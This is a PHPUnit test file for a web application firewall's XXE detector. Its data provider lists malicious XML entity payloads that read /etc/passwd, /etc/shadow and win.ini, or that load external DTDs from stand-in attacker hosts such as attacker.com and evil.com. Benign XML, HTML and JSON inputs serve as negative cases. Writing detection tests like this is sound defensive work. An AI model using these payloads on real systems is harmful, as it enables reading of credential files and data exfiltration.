<?php

declare(strict_types=1);

namespace Tests\Waf\Detection;

use PHPUnit\Framework\TestCase;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\Attributes\Test;
use Tests\Waf\WafDetectionProbe;

/**
 * XxeTest — verifica el detector de XML External Entity injection.
 */
final class XxeTest extends TestCase
{
    private WafDetectionProbe $probe;

    protected function setUp(): void
    {
        $this->probe = new WafDetectionProbe();
    }

    // ── TRUE POSITIVES ────────────────────────────────────────────────────────

    #[DataProvider('maliciousPayloads')]
    #[Test]
    public function detectsMaliciousPayload(string $payload): void
    {
        self::assertTrue(
            $this->probe->detectXxe($payload),
            "Se esperaba que detectara XXE en: [{$payload}]"
        );
    }

    public static function maliciousPayloads(): array
    {
        return [
            'doctype_system_file'   => ['<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'],
            'doctype_system_url'    => ['<!DOCTYPE foo SYSTEM "http://attacker.com/evil.dtd">'],
            'entity_public'         => ['<!ENTITY % xxe PUBLIC "-//XXE//" "http://evil.com/xxe.dtd">'],
            'entity_system_passwd'  => ['<!ENTITY lfi SYSTEM "file:///etc/shadow">'],
            'entity_system_win'     => ['<!ENTITY win SYSTEM "file:///c:/windows/win.ini">'],
            'doctype_public'        => ['<!DOCTYPE root PUBLIC "x" "http://attacker.com/x.dtd">'],
        ];
    }

    // ── TRUE NEGATIVES ────────────────────────────────────────────────────────

    #[DataProvider('legitimateInputs')]
    #[Test]
    public function allowsLegitimateInput(string $input): void
    {
        self::assertFalse(
            $this->probe->detectXxe($input),
            "Falso positivo en entrada legítima: [{$input}]"
        );
    }

    public static function legitimateInputs(): array
    {
        return [
            'plain_xml'         => ['<root><name>Juan</name></root>'],
            'xml_declaration'   => ['<?xml version="1.0" encoding="UTF-8"?>'],
            'html_doctype'      => ['<!DOCTYPE html>'],     // sin SYSTEM ni PUBLIC
            'text'              => ['Hola mundo'],
            'json'              => ['{"key":"value"}'],
        ];
    }
}